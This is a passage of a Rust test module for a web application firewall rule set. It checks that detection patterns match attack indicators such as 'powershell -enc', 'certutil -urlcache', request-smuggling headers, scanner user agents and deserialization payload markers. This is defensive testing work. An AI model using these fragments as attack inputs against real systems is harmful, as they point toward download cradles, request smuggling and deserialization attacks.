        let rule = rs.rules().iter().find(|r| r.id == 932130).unwrap();
        assert!(rule.pattern.is_match("powershell -enc"));
        assert!(rule.pattern.is_match("certutil -urlcache"));
        assert!(!rule.pattern.is_match("power supply"));
    }

    #[test]
    fn test_request_smuggling() {
        let rs = RuleSet::default_crs();
        let rule = rs.rules().iter().find(|r| r.id == 920140).unwrap();
        assert!(rule.pattern.is_match("transfer-encoding: chunked chunked"));
        assert!(rule.pattern.is_match("transfer-encoding: chunked, identity"));
    }

    #[test]
    fn test_scanner_detection() {
        let rs = RuleSet::default_crs();
        let rule = rs.rules().iter().find(|r| r.id == 913100).unwrap();
        assert!(rule.pattern.is_match("sqlmap/1.0"));
        assert!(rule.pattern.is_match("Nikto/2.1.6"));
        assert!(rule.pattern.is_match("nuclei"));
        assert!(!rule.pattern.is_match("Mozilla/5.0"));
    }

    #[test]
    fn test_deserialization() {
        let rs = RuleSet::default_crs();
        let rule = rs.rules().iter().find(|r| r.id == 944130).unwrap();
        assert!(rule.pattern.is_match(r#"O:4:"User":1:{}"#));
        assert!(rule.pattern.is_match("rO0ABX"));
        assert!(rule.pattern.is_match("php://filter/convert.base64-encode"));
        assert!(!rule.pattern.is_match("photos of cats"));
    }

    #[test]
    fn test_rule_count() {
        let rs = RuleSet::default_crs();
        assert_eq!(rs.len(), 49);
    }
}
